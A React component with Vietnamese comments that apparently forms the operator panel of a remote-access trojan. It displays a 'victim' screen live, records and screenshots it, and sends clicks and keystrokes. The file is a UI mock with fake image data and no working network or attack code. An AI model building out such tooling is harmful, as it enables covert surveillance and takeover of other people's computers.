/**
 * Victim Screen Viewer Component
 * Hiển thị màn hình victim theo thời gian thực với khả năng điều khiển
 */

import React, { useState, useEffect, useRef } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "../ui/card";
import { Button } from "../ui/button";
import { Badge } from "../ui/badge";
import { Slider } from "../ui/slider";
import { motion } from "framer-motion";
import {
  Monitor,
  MousePointer,
  Keyboard,
  Camera,
  Video,
  Pause,
  Play,
  Square,
  Maximize,
  Minimize,
  RotateCcw,
  Download,
  Settings,
  Zap,
  Eye,
  Target,
  Navigation,
  Crosshair
} from "lucide-react";
import toast from "react-hot-toast";

const VictimScreenViewer = ({ victimId, onClose }) => {
  const [isStreaming, setIsStreaming] = useState(false);
  const [isRecording, setIsRecording] = useState(false);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [quality, setQuality] = useState([75]);
  const [fps, setFps] = useState([30]);
  const [mouseTracking, setMouseTracking] = useState(true);
  const [keyboardControl, setKeyboardControl] = useState(true);
  const [cursorPosition, setCursorPosition] = useState({ x: 0, y: 0 });
  const [screenData, setScreenData] = useState(null);
  const canvasRef = useRef(null);
  const streamRef = useRef(null);

  // Mock screen data - trong thực tế sẽ nhận từ WebSocket
  const mockScreenData = {
    width: 1920,
    height: 1080,
    timestamp: new Date(),
    imageData: "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCdABmX/9k="
  };

  useEffect(() => {
    // Simulate receiving screen data
    const interval = setInterval(() => {
      if (isStreaming) {
        setScreenData({
          ...mockScreenData,
          timestamp: new Date()
        });
      }
    }, 1000 / fps[0]);

    return () => clearInterval(interval);
  }, [isStreaming, fps]);

  const startStreaming = () => {
    setIsStreaming(true);
    toast.success(`Bắt đầu stream màn hình victim ${victimId}`);
  };

  const stopStreaming = () => {
    setIsStreaming(false);
    setScreenData(null);
    toast.success("Đã dừng stream màn hình");
  };

  const startRecording = () => {
    setIsRecording(true);
    toast.success("Bắt đầu ghi màn hình");
  };

  const stopRecording = () => {
    setIsRecording(false);
    toast.success("Đã dừng ghi màn hình");
  };

  const takeScreenshot = () => {
    toast.success("Đã chụp screenshot");
  };

  const handleCanvasClick = (event) => {
    if (!keyboardControl) return;

    const canvas = canvasRef.current;
    const rect = canvas.getBoundingClientRect();
    const scaleX = mockScreenData.width / rect.width;
    const scaleY = mockScreenData.height / rect.height;
    
    const x = Math.round((event.clientX - rect.left) * scaleX);
    const y = Math.round((event.clientY - rect.top) * scaleY);
    
    setCursorPosition({ x, y });
    
    // Gửi lệnh click đến victim
    toast.success(`Click tại vị trí (${x}, ${y})`);
  };

  const handleKeyPress = (event) => {
    if (!keyboardControl) return;
    
    // Gửi phím đến victim
    toast.success(`Nhấn phím: ${event.key}`);
  };

  const toggleFullscreen = () => {
    setIsFullscreen(!isFullscreen);
  };

  return (
    <Card className={`bg-gradient-to-br from-slate-900/95 to-slate-800/95 border-slate-700 ${
      isFullscreen ? 'fixed inset-4 z-50' : ''
    }`}>
      <CardHeader>
        <CardTitle className="flex items-center justify-between text-white">
          <div className="flex items-center gap-2">
            <Monitor className="h-5 w-5 text-blue-400" />
            <span>Screen Viewer - {victimId}</span>
            {isStreaming && (
              <Badge className="bg-red-500/20 text-red-300 animate-pulse">
                <div className="w-2 h-2 bg-red-400 rounded-full mr-1" />
                LIVE
              </Badge>
            )}
          </div>
          
          <div className="flex items-center gap-2">
            {/* Control Buttons */}
            <Button
              size="sm"
              variant={isStreaming ? "destructive" : "default"}
              onClick={isStreaming ? stopStreaming : startStreaming}
            >
              {isStreaming ? <Square className="h-4 w-4" /> : <Play className="h-4 w-4" />}
            </Button>
            
            <Button
              size="sm"
              variant={isRecording ? "destructive" : "outline"}
              onClick={isRecording ? stopRecording : startRecording}
              disabled={!isStreaming}
            >
              <Video className="h-4 w-4" />
            </Button>
            
            <Button
              size="sm"
              variant="outline"
              onClick={takeScreenshot}
              disabled={!isStreaming}
            >
              <Camera className="h-4 w-4" />
            </Button>
            
            <Button
              size="sm"
              variant="outline"
              onClick={toggleFullscreen}
            >
              {isFullscreen ? <Minimize className="h-4 w-4" /> : <Maximize className="h-4 w-4" />}
            </Button>
            
            <Button
              size="sm"
              variant="ghost"
              onClick={onClose}
            >
              ✕
            </Button>
          </div>
        </CardTitle>
      </CardHeader>
      
      <CardContent className="space-y-4">
        {/* Control Settings */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4 p-4 bg-slate-800/50 rounded-lg">
          <div className="space-y-2">
            <label className="text-sm text-slate-300">Chất lượng: {quality[0]}%</label>
            <Slider
              value={quality}
              onValueChange={setQuality}
              max={100}
              min={10}
              step={10}
              className="w-full"
            />
          </div>
          
          <div className="space-y-2">
            <label className="text-sm text-slate-300">FPS: {fps[0]}</label>
            <Slider
              value={fps}
              onValueChange={setFps}
              max={60}
              min={5}
              step={5}
              className="w-full"
            />
          </div>
          
          <div className="flex items-center space-x-2">
            <input
              type="checkbox"
              id="mouseTracking"
              checked={mouseTracking}
              onChange={(e) => setMouseTracking(e.target.checked)}
              className="rounded"
            />
            <label htmlFor="mouseTracking" className="text-sm text-slate-300">
              Theo dõi chuột
            </label>
          </div>
          
          <div className="flex items-center space-x-2">
            <input
              type="checkbox"
              id="keyboardControl"
              checked={keyboardControl}
              onChange={(e) => setKeyboardControl(e.target.checked)}
              className="rounded"
            />
            <label htmlFor="keyboardControl" className="text-sm text-slate-300">
              Điều khiển bàn phím
            </label>
          </div>
        </div>

        {/* Screen Display */}
        <div className="relative bg-black rounded-lg overflow-hidden">
          {!isStreaming ? (
            <div className="aspect-video flex items-center justify-center text-slate-400">
              <div className="text-center">
                <Monitor className="h-16 w-16 mx-auto mb-4 opacity-50" />
                <p className="text-lg mb-2">Màn hình victim</p>
                <p className="text-sm">Nhấn Play để bắt đầu stream</p>
              </div>
            </div>
          ) : (
            <div className="relative">
              <canvas
                ref={canvasRef}
                className="w-full h-auto cursor-crosshair"
                width={mockScreenData.width}
                height={mockScreenData.height}
                onClick={handleCanvasClick}
                onKeyDown={handleKeyPress}
                tabIndex={0}
                style={{
                  background: `url(${mockScreenData.imageData}) no-repeat center/cover`,
                  aspectRatio: `${mockScreenData.width}/${mockScreenData.height}`
                }}
              />
              
              {/* Cursor Position Indicator */}
              {mouseTracking && (
                <motion.div
                  className="absolute w-4 h-4 border-2 border-red-400 rounded-full pointer-events-none"
                  style={{
                    left: `${(cursorPosition.x / mockScreenData.width) * 100}%`,
                    top: `${(cursorPosition.y / mockScreenData.height) * 100}%`,
                    transform: 'translate(-50%, -50%)'
                  }}
                  animate={{
                    scale: [1, 1.2, 1],
                    opacity: [0.7, 1, 0.7]
                  }}
                  transition={{
                    duration: 1,
                    repeat: Infinity
                  }}
                />
              )}
              
              {/* Stream Info Overlay */}
              <div className="absolute top-4 left-4 bg-black/70 text-white px-3 py-1 rounded text-sm">
                {mockScreenData.width}x{mockScreenData.height} • {fps[0]}fps • {quality[0]}%
              </div>
              
              {/* Recording Indicator */}
              {isRecording && (
                <div className="absolute top-4 right-4 bg-red-600/90 text-white px-3 py-1 rounded text-sm flex items-center gap-2">
                  <div className="w-2 h-2 bg-white rounded-full animate-pulse" />
                  REC
                </div>
              )}
            </div>
          )}
        </div>

        {/* Quick Actions */}
        <div className="grid grid-cols-2 md:grid-cols-6 gap-2">
          <Button
            size="sm"
            variant="outline"
            onClick={() => toast.success("Gửi Ctrl+C")}
            disabled={!isStreaming}
          >
            <Keyboard className="h-4 w-4 mr-1" />
            Copy
          </Button>
          
          <Button
            size="sm"
            variant="outline"
            onClick={() => toast.success("Gửi Ctrl+V")}
            disabled={!isStreaming}
          >
            <Keyboard className="h-4 w-4 mr-1" />
            Paste
          </Button>
          
          <Button
            size="sm"
            variant="outline"
            onClick={() => toast.success("Gửi Enter")}
            disabled={!isStreaming}
          >
            <Keyboard className="h-4 w-4 mr-1" />
            Enter
          </Button>
          
          <Button
            size="sm"
            variant="outline"
            onClick={() => toast.success("Gửi Tab")}
            disabled={!isStreaming}
          >
            <Keyboard className="h-4 w-4 mr-1" />
            Tab
          </Button>
          
          <Button
            size="sm"
            variant="outline"
            onClick={() => toast.success("Gửi Alt+Tab")}
            disabled={!isStreaming}
          >
            <Navigation className="h-4 w-4 mr-1" />
            Alt+Tab
          </Button>
          
          <Button
            size="sm"
            variant="outline"
            onClick={() => toast.success("Refresh màn hình")}
            disabled={!isStreaming}
          >
            <RotateCcw className="h-4 w-4 mr-1" />
            Refresh
          </Button>
        </div>

        {/* Status Info */}
        <div className="flex items-center justify-between text-sm text-slate-400 pt-2 border-t border-slate-700">
          <div className="flex items-center gap-4">
            <span>Cursor: ({cursorPosition.x}, {cursorPosition.y})</span>
            <span>Kết nối: {isStreaming ? 'Đang hoạt động' : 'Không hoạt động'}</span>
          </div>
          <div className="flex items-center gap-2">
            {keyboardControl && (
              <Badge className="bg-green-500/20 text-green-300">
                <Keyboard className="h-3 w-3 mr-1" />
                KB Control
              </Badge>
            )}
            {mouseTracking && (
              <Badge className="bg-blue-500/20 text-blue-300">
                <MousePointer className="h-3 w-3 mr-1" />
                Mouse Track
              </Badge>
            )}
          </div>
        </div>
      </CardContent>
    </Card>
  );
};

export default VictimScreenViewer;
